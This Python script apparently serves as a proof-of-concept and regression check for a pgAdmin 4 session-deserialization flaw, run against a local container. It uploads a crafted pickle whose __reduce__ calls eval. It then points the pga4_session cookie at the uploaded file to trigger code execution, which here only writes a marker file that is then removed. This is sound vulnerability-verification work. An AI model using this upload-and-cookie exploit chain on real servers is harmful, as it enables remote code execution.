"""Real stock pgAdmin protocol controls; never loads Framework or unpickles locally."""
from pathlib import Path
import base64
import hashlib
import http.cookiejar
import json
import pickle
import posixpath
import re
import subprocess
import sys
import urllib.error
import urllib.parse
import urllib.request

runtime = json.loads(Path(sys.argv[1]).read_text())
out = Path(runtime['directory'])
release = runtime['release']
base = 'http://127.0.0.1:' + str(runtime['port']) + runtime.get('prefix', '')
compose = runtime['compose']
email = 'module-admin@example.com'
password = 'module-target-password'
report = {'release': release, 'requests': [], 'commands': [], 'cases': [], 'owner_loaded': False}


def save():
    (out / 'native-proof.json').write_text(json.dumps(report, indent=2) + '\n')


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, request, handle, code, message, headers, newurl):
        return None


def client():
    return urllib.request.build_opener(NoRedirect(), urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))


def request(opener, label, path, data=None, headers=None):
    req = urllib.request.Request(base + path, data=data, headers={'User-Agent': 'pgadmin-native-control', **(headers or {})})
    try:
        response = opener.open(req, timeout=15)
    except urllib.error.HTTPError as error:
        response = error
    with response:
        body = response.read()
        status = response.code
        response_headers = dict(response.headers)
    (out / (label + '.body')).write_bytes(body)
    report['requests'].append({'label': label, 'path': path, 'method': req.get_method(), 'status': status, 'request_sha256': hashlib.sha256(data or b'').hexdigest(), 'response_sha256': hashlib.sha256(body).hexdigest(), 'headers': response_headers})
    save()
    return status, response_headers, body


def native(label, code, *arguments):
    argv = compose + ['exec', '-T', 'app', '/venv/bin/python3', '-c', code, *arguments]
    result = subprocess.run(argv, capture_output=True, timeout=20)
    (out / (label + '.stdout')).write_bytes(result.stdout)
    (out / (label + '.stderr')).write_bytes(result.stderr)
    report['commands'].append({'label': label, 'argv': argv, 'exit': result.returncode})
    save()
    assert result.returncode == 0, (label, result.stderr.decode(errors='replace'))
    return json.loads(result.stdout)


def inspect_file(label, path):
    code = "import base64,hashlib,json,os,sys;from pathlib import Path;p=Path(sys.argv[1]);s=p.stat() if p.is_file() else None;print(json.dumps({'exists':s is not None,'uid':s.st_uid if s else None,'sha256':hashlib.sha256(p.read_bytes()).hexdigest() if s else None,'base64':base64.b64encode(p.read_bytes()).decode() if s else None}))"
    return native(label, code, path)


def token(body):
    match = re.search(rb'"csrfToken"\s*:\s*"([A-Za-z0-9_.+-]+)"', body)
    if match:
        return match[1].decode()
    match = re.search(rb'<input[^>]+id=["\']csrf_token["\'][^>]+value=["\']([^"\']+)', body)
    assert match, 'No native CSRF token in login response'
    return match[1].decode()


def login(label, supplied_password, valid, username=email):
    opener = client()
    status, _, body = request(opener, label + '-page', '/login')
    assert status == 200 and b'pgAdmin 4' in body
    csrf = token(body)
    body = urllib.parse.urlencode({'csrf_token': csrf, 'email': username, 'password': supplied_password, 'language': 'en', 'internal_button': 'Login'}).encode()
    status, headers, _ = request(opener, label + '-submit', '/authenticate/login', body, {'Content-Type': 'application/x-www-form-urlencoded'})
    if valid:
        assert status == 302 and not headers.get('Location', '').startswith('/login'), (status, headers.get('Location'))
    status, headers, raw = request(opener, label + '-authorized-operation', '/file_manager/init', json.dumps({'dialog_type': 'storage_dialog', 'supported_types': ['sql', 'csv', 'json', '*'], 'dialog_title': 'Native storage'}).encode(), {'Content-Type': 'application/json', 'X-pgA-CSRFToken': csrf})
    if valid:
        assert status == 200 and json.loads(raw)['data']['transId'] is not None, (status, raw[:250])
    elif valid is False:
        assert status in [302, 401, 403] and (status != 302 or '/login' in headers.get('Location', '')), (status, raw[:250])
    else:
        assert status in [200, 302, 401, 403], (status, raw[:250])
        if status == 200:
            assert json.loads(raw)['data']['transId'] is not None
    report['cases'].append({'case': label, 'username': username, 'authorized': status == 200, 'passed': True})
    save()
    return opener, csrf


def transaction(opener, csrf, label):
    status, _, raw = request(opener, label, '/file_manager/init', json.dumps({'dialog_type': 'storage_dialog', 'supported_types': ['sql', 'csv', 'json', '*'], 'dialog_title': 'Native storage'}).encode(), {'Content-Type': 'application/json', 'X-pgA-CSRFToken': csrf})
    assert status == 200
    return json.loads(raw)['data']['transId']


def upload(opener, csrf, label, filename, contents):
    transaction_id = transaction(opener, csrf, label + '-init')
    boundary = 'pgadmin-native-' + runtime['stamp']
    parts = [('--' + boundary).encode(), ('Content-Disposition: form-data; name="newfile"; filename="' + filename + '"').encode(), b'Content-Type: application/octet-stream', b'', contents]
    for key, value in [('mode', 'add'), ('currentpath', '/'), ('storage_folder', 'my_storage')]:
        parts += [('--' + boundary).encode(), ('Content-Disposition: form-data; name="' + key + '"').encode(), b'', value.encode()]
    parts += [('--' + boundary + '--').encode(), b'']
    status, _, raw = request(opener, label + '-upload', '/file_manager/filemanager/' + str(transaction_id) + '/', b'\r\n'.join(parts), {'Content-Type': 'multipart/form-data; boundary=' + boundary, 'X-pgA-CSRFToken': csrf})
    assert status == 200 and json.loads(raw)['success'] == 1, (status, raw[:300])
    path = json.loads(raw)['data']['result']['Name']
    assert path.startswith(report['identity']['storage_path'] + '/') and path.endswith('/' + filename), path
    observed = inspect_file(label + '-uploaded-bytes', path)
    assert observed['uid'] == 5050 and observed['sha256'] == hashlib.sha256(contents).hexdigest()
    return path


def delete(opener, csrf, label, filename, path):
    transaction_id = transaction(opener, csrf, label + '-delete-init')
    status, _, raw = request(opener, label + '-delete', '/file_manager/filemanager/' + str(transaction_id) + '/', json.dumps({'mode': 'delete', 'path': '/' + filename, 'storage_folder': 'my_storage'}).encode(), {'Content-Type': 'application/json', 'X-pgA-CSRFToken': csrf})
    assert status == 200 and json.loads(raw)['success'] == 1
    assert not inspect_file(label + '-deleted-absence', path)['exists']


class Canary:
    def __init__(self, expression):
        self.expression = expression

    def __reduce__(self):
        return eval, (self.expression,)


try:
    identity = native('identity', "import config,hashlib,json,os,platform;from pathlib import Path;print(json.dumps({'version':str(config.APP_RELEASE)+'.'+str(config.APP_REVISION),'version_int':config.APP_VERSION_INT,'python':platform.python_version(),'uid':os.geteuid(),'session_path':config.SESSION_DB_PATH,'storage_path':config.STORAGE_DIR,'sources':{name:hashlib.sha256(Path('/pgadmin4/'+name).read_bytes()).hexdigest() for name in ['pgadmin/utils/session.py','pgadmin/misc/file_manager/__init__.py']}}))")
    report['identity'] = identity
    assert identity['version'] == release and identity['uid'] == 5050
    expected_sources = json.loads((Path(__file__).parent / 'profiles.json').read_text())[release]['sources']
    for name, digest in identity['sources'].items():
        assert digest == expected_sources[name], name
    login('wrong-password', 'module-target-wrong-password', False)
    opener, csrf = login('correct-password', password, True)
    filename = 'native-storage-' + runtime['stamp'] + '.sql'
    contents = b'-- real native storage upload\nSELECT 1;\n'
    path = upload(opener, csrf, 'ordinary-file', filename, contents)
    delete(opener, csrf, 'ordinary-file', filename, path)
    report['cases'].append({'case': 'ordinary-storage-upload-delete', 'passed': True})
    for mode in ['relative', 'absolute']:
        label = 'pickle-' + mode
        filename = 'native-' + runtime['stamp'] + '-' + mode + '.pickle'
        marker = '/tmp/module-target-pgadmin-' + runtime['stamp'] + '-' + mode
        expected = ('pgadmin-native-' + release + '-' + mode).encode()
        assert not inspect_file(label + '-marker-before', marker)['exists']
        expression = "(__import__('pathlib').Path(" + repr(marker) + ").write_bytes(bytes.fromhex(" + repr(expected.hex()) + ")),None,None,{})[1:]"
        payload = pickle.dumps(Canary(expression), protocol=4)
        (out / (label + '.pickle')).write_bytes(payload)
        path = upload(opener, csrf, label, filename, payload)
        sid = posixpath.relpath(path, identity['session_path']) if mode == 'relative' else path
        logical = sid + '!native-invalid-signature'
        escaped = logical.replace(chr(92), chr(92) * 2).replace(chr(34), chr(92) + chr(34)).encode('utf-8')
        quoted = b'"' + b''.join(('\\%03o' % byte).encode() if byte >= 128 else bytes([byte]) for byte in escaped) + b'"'
        header = (b'pga4_session=' + quoted).decode('ascii')
        request(client(), label + '-trigger', '/login', headers={'Cookie': header})
        report['requests'][-1]['request_cookie_base64'] = base64.b64encode(header.encode('latin-1')).decode()
        report['requests'][-1]['logical_sid'] = sid
        observed = inspect_file(label + '-marker-after', marker)
        vulnerable = release == '8.3'
        passed = observed['exists'] and observed['uid'] == 5050 and observed['base64'] == base64.b64encode(expected).decode() if vulnerable else not observed['exists']
        report['cases'].append({'case': label, 'expected_execution': vulnerable, 'observed': observed, 'passed': passed})
        save()
        delete(opener, csrf, label, filename, path)
        native(label + '-marker-cleanup', "import json,sys;from pathlib import Path;p=Path(sys.argv[1]);p.unlink(missing_ok=True);print(json.dumps({'absent':not p.exists()}))", marker)
        assert passed, (label, observed)
    login('login-after', password, True)
    uppercase, uppercase_csrf = login('uppercase-login', password, None, username=email.upper())
    if report['cases'][-1]['authorized']:
        filename = 'native-uppercase-' + runtime['stamp'] + '.sql'
        path = upload(uppercase, uppercase_csrf, 'uppercase-storage', filename, b'-- case control\n')
        delete(uppercase, uppercase_csrf, 'uppercase-storage', filename, path)
        report['cases'].append({'case': 'uppercase-storage-path', 'input_email': email.upper(), 'actual_path': path, 'owner_assumed_path': '/var/lib/pgadmin/storage/' + email.upper().replace('@', '_') + '/' + filename, 'passed': True})
    report['native_passed'] = True
except BaseException as error:
    report['failure'] = {'type': type(error).__name__, 'message': str(error)}
    raise
finally:
    save()
